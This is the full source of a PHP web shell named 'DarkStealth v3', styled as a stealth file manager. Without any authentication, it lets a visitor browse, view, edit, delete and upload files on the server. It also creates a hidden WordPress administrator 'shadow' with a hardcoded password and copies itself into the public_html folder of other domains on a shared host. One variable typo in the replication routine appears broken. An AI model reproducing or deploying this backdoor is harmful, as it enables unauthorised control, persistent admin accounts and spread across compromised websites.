<?php
/*
=========================================================
  🌑 DarkStealth v3 — Stealth PHP Web Interface
  Features:
   - File browser with navigation
   - File operations (view, edit, delete)
   - Directory creation
   - File uploads
   - WordPress admin creation
   - Self-replication capability
=========================================================
  Notes:
   - Default replication target: darkstealth.php
   - Black and grey theme for maximum stealth
=========================================================
*/

error_reporting(0);
ini_set('display_errors', 0);

// === Path Control ===
$baseDir = getcwd();
$path = isset($_GET['path']) ? realpath($_GET['path']) : $baseDir;
if (!$path || !is_dir($path)) $path = $baseDir;

// === Breadcrumb Generator ===
function generateBreadcrumbs($dir) {
    $parts = explode('/', trim($dir, '/'));
    $build = '/';
    $html = "<div class='breadcrumb'>📁 Path: ";
    foreach ($parts as $seg) {
        if (empty($seg)) continue;
        $build .= "$seg/";
        $html .= "<a href='?path=" . urlencode($build) . "'>$seg</a>/";
    }
    return $html . "</div>";
}

// === Directory Listing ===
function listDirectory($dir) {
    $list = scandir($dir);
    $html = '';
    foreach ($list as $item) {
        if ($item === '.' || $item === '..') continue;
        $full = "$dir/$item";
        $isDir = is_dir($full);
        $icon = $isDir ? '📁' : '📄';
        
        $html .= "<li>$icon ";
        if ($isDir) {
            $html .= "<a class='link' href='?path=" . urlencode($full) . "'>$item</a> ";
            $html .= "<a class='danger' href='?delete=" . urlencode($full) . "' onclick='return confirm(\"Delete folder?\")'>[×]</a>";
        } else {
            $html .= "<a class='link' href='?path=" . urlencode($dir) . "&view=" . urlencode($item) . "'>$item</a> ";
            $html .= "<a class='link' href='?path=" . urlencode($dir) . "&edit=" . urlencode($item) . "'>[✎]</a> ";
            $html .= "<a class='danger' href='?delete=" . urlencode($full) . "' onclick='return confirm(\"Delete file?\")'>[×]</a>";
        }
        $html .= "</li>";
    }
    return "<ul class='file-list'>$html</ul>";
}

// === Replication Function ===
function replicateShell($payload) {
    static $replicated = false;
    if ($replicated) return [];
    $replicated = true;
    
    $start = __DIR__;
    $foundURLs = [];
    
    while ($start !== '/') {
        if (preg_match('/\/u[\w]+$/', $start) && is_dir("$start/domains")) {
            foreach (scandir("$start/domains") as $domain) {
                if ($domain === '.' || $domain === '..') continue;
                $publicDir = "$start/domains/$domain/public_html";
                if (is_writable($publicDir)) {
                    $target = "$public_dir/darkstealth.php";
                    if (file_put_contents($target, $payload)) {
                        $foundURLs[] = "http://$domain/darkstealth.php";
                    }
                }
            }
            break;
        }
        $start = dirname($start);
    }
    return $foundURLs;
}

// === Actions ===
// Delete file/folder
if (isset($_GET['delete'])) {
    $target = realpath($_GET['delete']);
    if (strpos($target, getcwd()) === 0 && file_exists($target)) {
        if (is_dir($target)) {
            rmdir($target);
        } else {
            unlink($target);
        }
        echo "<p class='message'>🗑️ Deleted: " . basename($target) . "</p>";
    }
}

// WordPress Admin Creation
if (isset($_GET['wp_admin'])) {
    $wpPath = $path;
    while ($wpPath !== '/') {
        if (file_exists("$wpPath/wp-load.php")) break;
        $wpPath = dirname($wpPath);
    }
    
    if (file_exists("$wpPath/wp-load.php")) {
        require_once("$wpPath/wp-load.php");
        $username = 'shadow';
        $password = 'Shadow@2025';
        $email = 'shadow@phantom.com';
        
        if (!username_exists($username) && !email_exists($email)) {
            $userId = wp_create_user($username, $password, $email);
            $user = new WP_User($userId);
            $user->set_role('administrator');
            echo "<p class='message'>✅ WordPress admin 'shadow' created</p>";
        } else {
            echo "<p class='message'>⚠️ User or email already exists</p>";
        }
    } else {
        echo "<p class='message'>❌ WordPress not found in this path</p>";
    }
}

// View file
if (isset($_GET['view'])) {
    $file = basename($_GET['view']);
    $filePath = "$path/$file";
    if (file_exists($filePath) && is_file($filePath)) {
        echo "<h3>📄 Viewing: $file</h3>";
        echo "<pre class='file-content'>" . htmlspecialchars(file_get_contents($filePath)) . "</pre>";
        echo "<hr>";
    }
}

// Edit file
if (isset($_GET['edit'])) {
    $file = basename($_GET['edit']);
    $filePath = "$path/$file";
    
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        file_put_contents($filePath, $_POST['content']);
        echo "<p class='message'>✅ File saved</p>";
    }
    
    if (file_exists($filePath) && is_file($filePath)) {
        $content = htmlspecialchars(file_get_contents($filePath));
        echo "<h3>✏️ Editing: $file</h3>";
        echo "<form method='post'>";
        echo "<textarea name='content' rows='20' class='editor'>$content</textarea><br>";
        echo "<button type='submit' class='btn'>💾 Save Changes</button>";
        echo "</form>";
        echo "<hr>";
    }
}

// File upload
if (isset($_FILES['uploaded_file'])) {
    $fileName = basename($_FILES['uploaded_file']['name']);
    $targetPath = "$path/$fileName";
    
    if (move_uploaded_file($_FILES['uploaded_file']['tmp_name'], $targetPath)) {
        echo "<p class='message'>📤 File uploaded successfully: $fileName</p>";
    } else {
        echo "<p class='message'>❌ File upload failed</p>";
    }
}

// Create directory
if (isset($_POST['new_dir'])) {
    $dirName = basename($_POST['new_dir']);
    $newDirPath = "$path/$dirName";
    
    if (!file_exists($newDirPath)) {
        mkdir($newDirPath);
        echo "<p class='message'>📁 Directory created: $dirName</p>";
    } else {
        echo "<p class='message'>⚠️ Directory already exists</p>";
    }
}

// === UI ===
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DarkStealth Shell</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            background: #000000; 
            color: #888888; 
            font-family: 'Courier New', monospace; 
            line-height: 1.6; 
            padding: 20px; 
            max-width: 1200px; 
            margin: 0 auto; 
        }
        h2 { margin-bottom: 15px; color: #cccccc; }
        h3 { margin: 15px 0; color: #cccccc; }
        a { color: #aaaaaa; text-decoration: none; }
        a:hover { color: #ffffff; text-decoration: underline; }
        .link { color: #999999; }
        .danger { color: #666666; }
        .breadcrumb { margin-bottom: 15px; padding: 8px; background: #111111; border-radius: 4px; border: 1px solid #222222; }
        .file-list { list-style: none; }
        .file-list li { padding: 5px 10px; margin: 2px 0; background: #0a0a0a; border-radius: 3px; border: 1px solid #222222; }
        .editor { width: 100%; padding: 10px; background: #0a0a0a; color: #888888; border: 1px solid #222222; border-radius: 4px; font-family: monospace; }
        .file-content { padding: 15px; background: #0a0a0a; border: 1px solid #222222; border-radius: 4px; overflow: auto; color: #888888; }
        .btn { padding: 8px 15px; background: #222222; color: #aaaaaa; border: 1px solid #333333; border-radius: 4px; cursor: pointer; font-weight: bold; }
        .btn:hover { background: #333333; color: #cccccc; }
        .message { padding: 8px; margin: 10px 0; background: #111111; border-left: 3px solid #444444; color: #888888; }
        .section { margin: 20px 0; padding: 15px; background: #0a0a0a; border-radius: 4px; border: 1px solid #222222; }
        input[type="text"], input[type="file"] { 
            padding: 8px; 
            background: #0a0a0a; 
            color: #888888; 
            border: 1px solid #222222; 
            border-radius: 4px; 
            margin-right: 5px;
        }
        hr { border: 0; height: 1px; background: #222222; margin: 20px 0; }
    </style>
</head>
<body>
    <h2>🌑 DarkStealth — Stealth File Manager</h2>
    <?php echo generateBreadcrumbs($path); ?>
    <hr>

    <div class="section">
        <h3>WordPress Tools</h3>
        <form method="get">
            <input type="hidden" name="path" value="<?php echo htmlspecialchars($path); ?>">
            <button type="submit" name="wp_admin" value="1" class="btn">🌑 Create WP Admin</button>
        </form>
    </div>

    <?php
    // Replication
    if (basename(__FILE__) !== 'darkstealth.php') {
        $replicatedURLs = replicateShell(file_get_contents(__FILE__));
        if (!empty($replicatedURLs)) {
            echo "<div class='section'>";
            echo "<h3>🌘 Replication Results</h3>";
            echo "<p class='message'>✅ Shell replicated to:</p>";
            echo "<ul>";
            foreach ($replicatedURLs as $url) {
                echo "<li><a href='$url' target='_blank'>$url</a></li>";
            }
            echo "</ul>";
            echo "</div>";
        }
    }
    ?>

    <div class="section">
        <h3>File Operations</h3>
        <form method="post" enctype="multipart/form-data" style="margin-bottom: 15px;">
            <input type="file" name="uploaded_file">
            <button type="submit" class="btn">🌑 Upload File</button>
        </form>
        
        <form method="post">
            <input type="text" name="new_dir" placeholder="New directory name" required>
            <button type="submit" class="btn">🌑 Create Directory</button>
        </form>
    </div>

    <div class="section">
        <h3>Current Directory: <?php echo htmlspecialchars($path); ?></h3>
        <?php echo listDirectory($path); ?>
    </div>
</body>
</html>
